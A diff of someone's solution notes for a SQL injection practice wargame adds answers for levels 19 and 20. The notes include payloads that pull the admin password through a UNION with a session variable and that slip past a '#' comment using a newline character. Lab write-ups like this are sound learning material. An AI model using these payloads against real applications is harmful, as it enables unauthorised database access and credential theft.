@@ -123,16 +123,19 @@ level-18 (nightmare):
   -> the level is cleared
 
 level-19 (Xavis):
-  ->
-
-
+  -> add a parameter named pw in url.
+  -> ?pw=' or (SELECT @ad:=pw WHERE id='admin') UNION SELECT @ad -- -
+  -> ad is a user defined session variable.
+  -> the level is cleared..
 
 level-20 (dragon):
   -> since in the query # is present which comments out the rest of the statement in the query.
-  -> to end the comment we can use a new line or line break character (\n)
-  -> 
+  -> to end the comment we can use a new line or line break character (\n)..
   -> pw='%0A and 1=0 or id='admin'-- -
-  -> the level is cleared
+  -> the level is cleared.
+
+level-21 (iron_golem):
+  -> 
 
 
 
